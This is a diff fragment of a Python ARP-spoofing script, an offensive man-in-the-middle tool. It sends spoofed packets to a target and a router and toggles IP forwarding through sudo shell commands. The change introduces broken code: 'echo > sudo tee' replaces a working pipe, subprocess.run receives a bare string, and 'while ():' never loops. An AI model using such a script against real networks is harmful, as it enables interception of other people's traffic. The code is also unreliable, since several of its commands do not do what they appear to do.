@@ -59,12 +59,12 @@ def spoof(dest_IP, spoofed_IP):
 
 def start_flow(i):
     print("[+] Stated port forwarding")
-    subprocess.run("echo '1' | sudo tee /proc/sys/net/ipv4/conf/" + i + "/forwarding")
+    subprocess.run("echo '1' > sudo tee /proc/sys/net/ipv4/conf/" + i + "/forwarding")
 
 
 def stop_flow(i):
     print("[+] ending port forwarding")
-    subprocess.run("echo '0' | sudo tee /proc/sys/net/ipv4/conf/" + i + "/forwarding")
+    subprocess.run("echo '0' > sudo tee /proc/sys/net/ipv4/conf/" + i + "/forwarding")
 
 
 def main():
@@ -76,7 +76,7 @@ def main():
     packet_for_target = spoof(target_IP, router_IP)
     packet_for_router = spoof(router_IP, target_IP)
 
-    start_flow()
+    start_flow(interface)
 
     print("[+] Spoofing has begin")
     while ():
